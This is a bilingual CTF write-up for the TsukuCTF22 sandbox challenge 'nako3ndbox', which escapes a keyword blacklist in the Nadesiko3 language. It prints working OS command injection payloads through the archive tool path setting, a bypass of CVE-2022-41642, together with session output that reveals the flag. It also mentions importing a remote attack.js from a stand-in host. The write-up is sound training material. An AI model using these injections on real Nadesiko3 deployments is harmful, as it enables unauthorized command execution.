---
title: nako3ndbox
description: なでしこのサンドボックス問題
author: Satoki
genre: Misc
solver: 6
point: 500
---


# nako3ndbox

## 問題文
に・ほ・ん・ご・で・あ・そ・ぼ  
`nc tsukuctf.sechack365.com 31418`  

## 難易度
**medium**  

## 作問にあたって
なでしこ3の修正済みである脆弱性を使ったJail問題です。  
もともとは最新版を使い`！「http://ctf.example.com/attack.js」を取り込み`でRCEさせようと思っていましたが、`ナデシコする`でうまく動かないため、見つけた脆弱性を用いる事にしました。  
一応、CVE-2022-41642のバイパスなのでまだCVEはついていません(頑張れば脆弱性なしで解けます)。  

## 解法
なでしこ3を用いたJail問題のようだ。  
配布されたソースは以下のようであった。

```bash
「------------------------------------------------------------
             _        _____           _ _
 _ __   __ _| | _____|___ / _ __   __| | |__   _____  __
| '_ \ / _` | |/ / _ \ |_ \| '_ \ / _` | '_ \ / _ \ \/ /
| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <
|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\

------------------------------------------------------------」と言う

「日本語コード：」と尋ねる
それを入力に代入

ブラックリスト＝「読、開、保存、実行、起動、サーバ、フォルダ、ファイル、ナデシコ、ディレクトリ、flag」を「、」で区切る

ブラックリスト！＝空の間
　　ブラックリストの０から１を配列取り出す
　　もし（入力でそれの出現回数）！＝０ならば
　　　　「日本語の世界からは出しませんよ！！！」と言う
　　　　終了する
　　ここまで
ここまで

「｛入力｝」をナデシコする

終了する
```

入力された文字列をブラックリストで検証し、evalにあたる`ナデシコする`で実行している。  
ブラックリストがない場合、`「ls」を起動`などでRCE可能だが今回は難しい。  
ここで配布されたファイルより、なでしこ3が最新版でなく、3.3.67である点に注目する。  
GitHubのIssuesを見てやると[cnako3の圧縮解凍の問題](https://github.com/kujirahand/nadesiko3/issues/1325)が見つかる。  
複数のシングルクォートを圧縮解凍系の処理に含めることで、OSコマンドインジェクションが可能なようだ。  
この修正を参考に任意コード実行を行う。  
今回は以下のように`圧縮解凍ツールパス`の引数としてコマンドを与える。  

```bash
$ nc tsukuctf.sechack365.com 31418
------------------------------------------------------------
             _        _____           _ _
 _ __   __ _| | _____|___ / _ __   __| | |__   _____  __
| '_ \ / _` | |/ / _ \ |_ \| '_ \ / _` | '_ \ / _ \ \/ /
| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <
|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\

------------------------------------------------------------
日本語コード：圧縮解凍ツールパスは「'';sleep 10;'」。「」を「」へ解凍
/bin/sh: ': not found
/bin/sh: : Permission denied
[実行時エラー]app(1行目): Command failed: ''\''';sleep 10;'' x '' -o'' -y
/bin/sh: ': not found
/bin/sh: : Permission denied
~~~
```

`sleep 10`を行うと10秒スリープした。  
フラグは`flag.txt`にあるので読みだせばよいが、`flag`がブラックリストにある。  
`./f*`などで回避してやればよい。  
コマンドの実行結果がなぜか出てこないことがあるので、`sh`に渡してエラーとして吐き出せばよい。  

```bash
$ nc tsukuctf.sechack365.com 31418
------------------------------------------------------------
             _        _____           _ _
 _ __   __ _| | _____|___ / _ __   __| | |__   _____  __
| '_ \ / _` | |/ / _ \ |_ \| '_ \ / _` | '_ \ / _ \ \/ /
| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <
|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\

------------------------------------------------------------
日本語コード：圧縮解凍ツールパスは「'';sh ./f*;'」。「」を「」へ解凍
/bin/sh: ': not found
./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found
/bin/sh: : Permission denied
[実行時エラー]app(1行目): Command failed: ''\''';sh ./f*;'' x '' -o'' -y
/bin/sh: ': not found
./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found
/bin/sh: : Permission denied
~~~
```

flagが得られた。  

## TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}

## Abstract
This is a Jail related to a known vulnerability in なでしこ3
First I intended to make a RCE question by `！「http://ctf.example.com/attack.js」を取り込み`. However, `ナデシコする` didn't work well. Thats why I use the vulnerability instead.  

## Solve
This seems Jail with なでしこ3.
The ditributed source code is the following.
```
```
<!-- XXXX:なでしこソース追加 -->  
This program execute the given strings with `ナデシコする` which corresponds to the eval command after given strings are checked.
You could RCE by `「ls」を起動` if it were not checked. We can't do this for this case.
Btw, this is ver 3.3.67 which is not the latest one and this has [an issue related to cnako3](https://github.com/kujirahand/nadesiko3/issues/1325)
This is OS command injection. You can use this vulnerability.

```bash
$ nc tsukuctf.sechack365.com 31418
------------------------------------------------------------
             _        _____           _ _
 _ __   __ _| | _____|___ / _ __   __| | |__   _____  __
| '_ \ / _` | |/ / _ \ |_ \| '_ \ / _` | '_ \ / _ \ \/ /
| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <
|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\

------------------------------------------------------------
日本語コード：圧縮解凍ツールパスは「'';sleep 10;'」。「」を「」へ解凍
/bin/sh: ': not found
/bin/sh: : Permission denied
[実行時エラー]app(1行目): Command failed: ''\''';sleep 10;'' x '' -o'' -y
/bin/sh: ': not found
/bin/sh: : Permission denied
~~~
```

`sleep 10` make the thread sleep for 10 seconds.
As the `flag` is blacklisted, you should specify like `./f*` to get `flag.txt`.
I don't know why but sometimes we can't get the result. So get the result as Error Message through `sh` instead.
```bash
$ nc tsukuctf.sechack365.com 31418
------------------------------------------------------------
             _        _____           _ _
 _ __   __ _| | _____|___ / _ __   __| | |__   _____  __
| '_ \ / _` | |/ / _ \ |_ \| '_ \ / _` | '_ \ / _ \ \/ /
| | | | (_| |   < (_) |__) | | | | (_| | |_) | (_) >  <
|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\

------------------------------------------------------------
日本語コード：圧縮解凍ツールパスは「'';sh ./f*;'」。「」を「」へ解凍
/bin/sh: ': not found
./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found
/bin/sh: : Permission denied
[実行時エラー]app(1行目): Command failed: ''\''';sh ./f*;'' x '' -o'' -y
/bin/sh: ': not found
./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found
/bin/sh: : Permission denied
~~~
```
Now you get the FLAG.

## TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}